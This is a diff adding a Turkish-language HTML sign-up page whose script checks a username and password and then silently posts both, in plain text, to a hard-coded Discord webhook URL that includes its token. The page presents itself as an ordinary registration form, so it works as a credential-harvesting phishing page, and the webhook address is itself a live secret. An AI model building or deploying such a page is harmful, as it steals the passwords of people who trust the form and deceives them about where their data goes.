@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div>
+        Kullanıcı Adınızı giriniz
+    </div>
+    <input type="text" id = "ad">
+    <div>
+        Şifrenizi giriniz
+    </div>
+    <input id = "şifre" type="password">
+    <button id = "loginbutton">Kayıt ol</button>
+    <label id = "lb">Hatalar :</label>
+</body>
+<script>
+    const loginbutton = document.querySelector("#loginbutton");
+    const adinput = document.querySelector("#ad");
+    const psinput = document.querySelector("#şifre");
+    const label = document.querySelector("#lb");
+    function Control(){
+        let psarr = Array.from(psinput.value)
+        let adarr = Array.from(adinput.value)
+        if(adinput.value.trim() == "" || psinput.value.trim() == ""){
+            label.textContent = "Hatalar: Boşdeğer girilemez!"
+            return false;
+        } 
+        if(!isNaN(adarr[0])){
+            label.textContent = "Ad sayı ile başlayamaz!"
+            return false;
+        }
+        if (adarr.length < 5 ||adarr.length > 20){
+            label.textContent = "ad en az 5 karakterden oluşmalıdır max 20 karakter"
+            return false;
+        }
+        if (psarr.length < 8 || psarr.length > 50){
+            label.textContent = "Hatalar: Şifreniz en az 8 karakterden oluşması lazım max 50."
+            return false;
+        }
+        label.textContent = "Hatalar : "
+        return true;
+    }
+    loginbutton.addEventListener("click",function(){
+        if(Control()){
+        let mesaj = 
+`
+Kullanıcı ismi: ${adinput.value.replace(/\s/g, "")}
+Kullanıcı şifresi: ${psinput.value.replace(/\s/g, "")}
+`;
+            fetch("https://discord.com/api/webhooks/1409330649038327918/stew3a0YjmbBl-em2XynnvibizV5VFXORfZYAztslApTHSwA3r1lELivGXyV4IRwwB7w",{
+                method : "POST",
+                headers: {
+                    "Content-Type": "application/json" 
+                },
+                body : JSON.stringify({content : mesaj})
+            })
+        adinput.value = ""
+        psinput.value = ""
+    };
+    });
+</script>
+</html>
